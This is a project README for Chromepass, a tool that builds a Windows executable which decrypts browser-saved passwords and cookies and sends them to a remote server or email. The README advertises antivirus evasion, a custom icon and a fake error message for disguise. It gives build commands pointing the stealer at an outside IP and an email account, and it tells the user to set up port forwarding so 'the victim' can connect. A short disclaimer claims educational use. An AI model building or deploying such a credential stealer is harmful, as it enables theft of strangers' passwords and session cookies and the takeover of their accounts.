<h1 align='center'>Chromepass - Hacking Chrome Saved Passwords and Cookies</h1>
<p align="center">	
    <img src="https://img.shields.io/badge/Platform-Windows-green" />
	<a href="https://github.com/darkarp/chromepass/releases/latest">
	<img src="https://img.shields.io/github/v/release/darkarp/chromepass" alt="Release" />
	</a>
  <a href="https://travis-ci.org/darkarp/chrome-password-hacking">
    <img src="https://img.shields.io/badge/build-passing-green" alt="Build Status on CircleCI" />
	</a>
    <img src="https://img.shields.io/maintenance/yes/2021" />
	</br>
  
  <a href="https://github.com/darkarp/chromepass/commits/master">
    <img src="https://img.shields.io/github/last-commit/darkarp/chromepass" />
  </a>
  <img alt="Scrutinizer code quality (GitHub/Bitbucket)" src="https://img.shields.io/scrutinizer/quality/g/darkarp/chromepass?style=flat">
  <a href="https://github.com/darkarp/chromepass/blob/master/LICENSE">
    <img src="http://img.shields.io/github/license/darkarp/chromepass" />
  </a>
  </br>
  <a href="https://github.com/darkarp/chromepass/issues?q=is%3Aopen+is%3Aissue">
	<img alt="GitHub issues" src="https://img.shields.io/github/issues/darkarp/chromepass">
</a
<a href="https://github.com/darkarp/chromepass/issues?q=is%3Aissue+is%3Aclosed">
	<img alt="GitHub closed issues" src="https://img.shields.io/github/issues-closed/darkarp/chromepass">
</a>
</br>
  <a href="https://discord.gg/beczNYP">
    <img src="https://img.shields.io/badge/discord-join-7289DA.svg?logo=discord&longCache=true&style=flat" />
  </a>
  </br>
    <a href="https://github.com/darkarp/chromepass/blob/master/templates/resources/demo.gif" target="_blank">View Demo</a>
    ·
    <a href="https://github.com/darkarp/chromepass/issues/new?assignees=&labels=&template=bug_report.md&title=">Report Bug</a>
    ·
    <a href="https://github.com/darkarp/chromepass/issues/new?assignees=&labels=&template=feature_request.md&title=">Request Feature</a>
  </p>  
  
  
<!-- TABLE OF CONTENTS -->
## Table of Contents

* [About the Project](#about-the-project)  
	* [AV Detection](#av-detection)
* [Getting started](#getting-started)
  * [Prerequisites](#dependencies-and-requirements)
  * [Installation](#installation)
* [Usage](#usage)
* [Email](#email)
* [Errors, Bugs and Feature Requests](#errors-bugs-and-feature-requests)
* [Learn More](#learn-more)
* [License](#license)
* [Demo](#demo)
---
## About The project
Chromepass is a python-based console application that generates a windows executable with the following features:

  - Decrypt Google Chrome, Chromium, Edge, Brave, Opera and Vivaldi saved paswords and cookies
  - Send a file with the login/password combinations and cookies remotely (http server or email)
  - Undetectable by AV if done correctly
  - Custom icon
  - Custom error message
  - Customize port

---

### AV Detection!  

The new client build methodology practically ensures a 0% detection rate, even without AV-evasion tactics. If this becomes false in the future, some methods will be implemented to improve AV evasion.  

An example of latest scans (note: within 10-12 hours we go from 0-2 detections to 32 detections so run the analysis on your own builds): 
  * [VirusTotal Scan 1](https://www.virustotal.com/gui/file/71d5600e2e9dbdc446aeca554d1f033a69d6f5cf5a7565d317cc22329c084f51/detection)
  * [VirusTotal Scan 2](https://www.virustotal.com/gui/file/f674032061e3d5639d168d68d60a8ff0a53bc249705ec9eb032a385015c20a42/detection)
  * [VirusTotal Scan 3](https://www.virustotal.com/gui/file/462de7fc96d2db7af3400b23d32a75d28909c19e756678f0d2f261efde705165/detection)
  * [VirusTotal Scan 4](https://www.virustotal.com/gui/file/d71a48fb7dc02a14823ceeedd5808e13b6734873f7b1b5c09db433b59eab256e/detection)

 ---
## Getting started

### Dependencies and Requirements

This is a very simple application, which uses only:

* [Python] - Tested on python 3.9+

>It recommended to perform the installation inside a Windows VM. Some parts of the installation procedure might be affected by existing configurations. This was tested on a clean Windows 10 VM.

### Installation

>Chromepass requires Windows to compile! Support for linux and macOS may be added soon.

#### **Clone the repository**:
```powershell
git clone https://github.com/darkarp/chromepass
```
>Note: Alternatively to cloning the repository, you can download the latest release, since the repository may be more bug-prone.

### **Install the dependencies**:

The dependencies are checked and installed automatically, so you can just skip to [Usage](#usage). It's recommended that you use a clean VM, just to make sure there are no conflicts.

If you don't have the dependencies and your internet isn't fast, this will take a while. Go grab some coffee.   

---

## Usage

Chromepass is very straightforward. Start by running:
```powershell
python create.py -h
```
A list of options will appear and are self explanatory.

Running without any parameters will build the server and the client connecting to `127.0.0.1`. 

A simple example of a build:
```powershell
python create.py --ip 92.34.11.220 --error --message 'An Error has happened'
```

After creating the server and the client, make sure you're running the server when the client is ran.

The cookies and passwords will be saved in `json` files on a new folder called `data` in the same directory as the server, separated by ip address.  

-- --

## Email
Chromepass supports sending the files via email, although it's still experimental.
To enable this, you can use the `--email` flag while creating the server. You'll need two things, a username (your email) and a password (an app password).

To generate an app password you must go into your `account settings` -> `Security` and enable 2-step authentication (required!)

After 2-step authentication is enabled, you'll see a new option called `App Passwords`:
![2-step-authentication](https://i.imgur.com/Ip3ShCI.png)

You want to click there and then choose the appropriate options and then generate a password:
![2-step-authentication](https://i.imgur.com/DoQQ4Qn.png) 

After clicking `Generate` it will give you the needed password.
You can use the username and password directly in the command or you can simply put it inside the `config.ini`, where it says `YOUR_USERNAME` and `YOUR_PASSWORD`.

### Example with credentials in command
```powershell
python create.py --ip 92.34.11.220 --error --message 'An Error has happened' --email --username myuser@gmail.com --password qwertyuiopasdfghh
```
### If you put the credentials in the config file
```powershell
python create.py --ip 92.34.11.220 --error --message 'An Error has happened' --email
```

### Remote Notes
>If you'd like to use this in a remote scenario, you must also perform port forwarding (port 80 by default), so that when the victim runs the client it is able to connect to the server on the correct port.  
For more general information, click [here](https://www.noip.com/support/knowledgebase/general-port-forwarding-guide/). If you're still not satisfied, perform a google search.

---

## Manual dependency installation

The automated setup is experimental. For one reason or another, the setup might fail to correctly install the dependencies. If that's the case, you must install them manually.  
Fortunately, there are only 2 dependencies:  
  - [Microsoft Visual C++ Build Tools](https://visualstudio.microsoft.com/thank-you-downloading-visual-studio/?sku=BuildTools&rel=16) (install with the recommended workflows)
  - [Rustup](https://rustup.rs/)

Instead of the build tools you can also just install visual studio but it will take more space.

After successfully installing the build tools, you can simply run the `rustup-init.exe` from [Rustup](https://rustup.rs/)'s website.

This completes the required dependencies and you should be good to go.

---

## Errors, Bugs and feature requests

If you find an error or a bug, please report it as an issue.
If you wish to suggest a feature or an improvement please report it in the issue pages.

Please follow the templates shown when creating the issue.  

---


## Learn More

For access to a community full of aspiring computer security experts, ranging from the complete beginner to the seasoned veteran,
join our Discord Server: [WhiteHat Hacking](https://discord.gg/beczNYP)

If you wish to contact me, you can do so via: `mario@whitehathacking.tech` 

---

## Disclaimer
I am not responsible for what you do with the information and code provided. This is intended for professional or educational purposes only.

## License
<a href="https://github.com/darkarp/chromepass/blob/master/LICENSE"> AGPL-3.0 </a>

---
[![Code Intelligence Status](https://scrutinizer-ci.com/g/darkarp/chromepass/badges/code-intelligence.svg?b=master)](https://scrutinizer-ci.com/code-intelligence)  

[Python]: <https://www.python.org/downloads/>

## Demo
![til](./templates/resources/demo.gif)